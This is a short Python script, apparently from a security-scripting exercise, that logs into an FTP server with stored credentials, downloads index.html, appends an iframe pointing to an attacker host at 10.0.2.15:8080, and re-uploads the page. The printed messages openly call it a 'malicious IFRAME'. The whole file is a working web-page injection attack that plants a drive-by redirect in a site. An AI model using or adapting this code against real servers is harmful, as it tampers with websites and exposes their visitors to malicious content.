import ftplib

def injectPage(ftp,page,redirect):
     f=open(page+'.tmp','w')
     ftp.retrlines('RETR '+page,f.write)
     print('[+] Download Page: '+page)
     f.write(redirect)
     f.close()
     print('[+] Injected the malicious IFRAME on: '+page)
     ftp.storlines('STOR '+page,open(page+'.tmp'))
     print('[+] Uploaded Injected Page: '+page)

host='test.rebex.net'
username='demo'
password='password'
ftp=ftplib.FTP(host)
ftp.login(username,password)
redirect="<iframe src='http://10.0.2.15:8080/xW4LUmkRSexn9ID'><iframe>"
injectPage(ftp,'index.html',redirect)